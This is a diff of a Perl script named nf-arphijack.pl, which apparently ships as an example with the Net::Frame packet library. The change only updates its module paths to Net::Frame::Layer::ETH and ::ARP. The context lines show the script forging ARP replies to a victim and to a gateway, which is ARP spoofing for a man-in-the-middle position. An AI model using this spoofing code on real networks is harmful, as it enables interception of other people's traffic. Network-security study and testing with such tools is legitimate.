@@ -1,6 +1,6 @@
 #!/usr/bin/perl
 #
-# $Id: nf-arphijack.pl,v 1.4 2006/12/14 17:45:41 gomor Exp $
+# $Id: nf-arphijack.pl,v 1.5 2006/12/17 17:08:17 gomor Exp $
 #
 use strict;
 use warnings;
@@ -21,8 +21,8 @@ die("Usage: $0\n".
     "   -V  target victim MAC address\n".
     "") unless $opts{g} && $opts{v};
 
-use Net::Frame::ETH qw(:consts);
-use Net::Frame::ARP qw(:consts);
+use Net::Frame::Layer::ETH qw(:consts);
+use Net::Frame::Layer::ARP qw(:consts);
 use Net::Frame::Simple;
 use Net::Frame::Device;
 use Net::Write::Layer2;
@@ -42,12 +42,12 @@ print "Gateway: IP=$ipGateway - MAC=$macGateway\n";
 print "Victim : IP=$ipVictim - MAC=$macVictim\n";
 
 # Gateway tells victim
-my $eth1 = Net::Frame::ETH->new(
+my $eth1 = Net::Frame::Layer::ETH->new(
    type => NF_ETH_TYPE_ARP,
    src  => $macMy,
    dst  => $macVictim,
 );
-my $arp1 = Net::Frame::ARP->new(
+my $arp1 = Net::Frame::Layer::ARP->new(
    opCode => NF_ARP_OPCODE_REPLY,
    srcIp => $ipGateway,
    dstIp => $ipVictim,
@@ -60,12 +60,12 @@ my $replyToVictim = Net::Frame::Simple->new(
 print $replyToVictim->print."\n";
 
 # Victim tells gateway
-my $eth2 = Net::Frame::ETH->new(
+my $eth2 = Net::Frame::Layer::ETH->new(
    type => NF_ETH_TYPE_ARP,
    src  => $macMy,
    dst  => $macGateway,
 );
-my $arp2 = Net::Frame::ARP->new(
+my $arp2 = Net::Frame::Layer::ARP->new(
    opCode => NF_ARP_OPCODE_REPLY,
    srcIp => $ipVictim,
    dstIp => $ipGateway,
